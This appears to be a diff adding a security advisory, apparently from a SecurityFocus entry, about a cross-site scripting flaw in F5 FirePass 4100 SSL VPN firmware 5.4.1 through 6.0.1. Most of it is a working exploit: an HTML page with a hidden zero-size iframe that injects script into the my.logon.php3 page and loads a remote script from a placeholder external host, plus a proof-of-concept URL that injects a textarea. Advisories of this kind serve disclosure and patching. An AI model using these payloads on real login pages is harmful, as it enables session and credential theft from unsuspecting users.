@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/26659/info
+
+F5 Networks FirePass 4100 SSL VPN devices are prone to a cross-site scripting vulnerability because they fail to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+F5 Networks FirePass 4100 SSL VPNs running these firmware versions are vulnerable:
+
+5.4.1 through 5.5.2
+6.0
+6.0.1 
+
+<html>
+
+<iframe src="https://www.example.com/my.logon.php3?%22%3E%3C/script%3E%3Cscript%3Eeval%28name%29%3C/script%3E%3C%21--" width="0%" height="0%" name="xss=document.body.appendChild(document.createElement(&#039;script&#039;));xss.setAttribute(&#039;src&#039;,&#039;http://www.example2.com/b&#039;)"></iframe>
+
+</html>
+
+-----------------------------------------------
+
+Proof of concept (PoC) URL:
+
+https://www.example.com/my.logon.php3?"></script><textarea>HTML_injection_test&lt;/textarea&gt;<!--
+
+The payload in the example is 
+
+"></script><textarea>HTML_injection_test&lt;/textarea&gt;<!--
+
+which injects a &#039;textarea&#039; box
